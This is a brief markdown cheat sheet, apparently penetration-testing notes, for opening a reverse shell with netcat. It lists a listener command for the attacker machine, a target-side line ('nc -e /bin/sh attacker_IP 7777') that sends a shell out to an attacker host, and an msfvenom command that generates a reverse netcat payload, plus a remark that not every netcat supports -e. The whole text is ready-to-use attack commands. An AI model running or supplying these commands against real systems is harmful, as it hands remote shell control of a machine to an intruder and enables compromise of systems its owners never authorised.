# NetCat 
***

## Attacker Machine
```
rlwrap nc -nlvp 7777
```

## Target Machine
```
nc -e /bin/sh attacker_IP 7777
```

## Using Msfvenom
```
msfvenom -p cmd/unix/reverse_netcat LHOST=IP LPORT=7777 R
```

### Notes
- The issue at hand is that netcat is not universally installed on all servers, and even when it is, not every version of netcat supports the -e option.
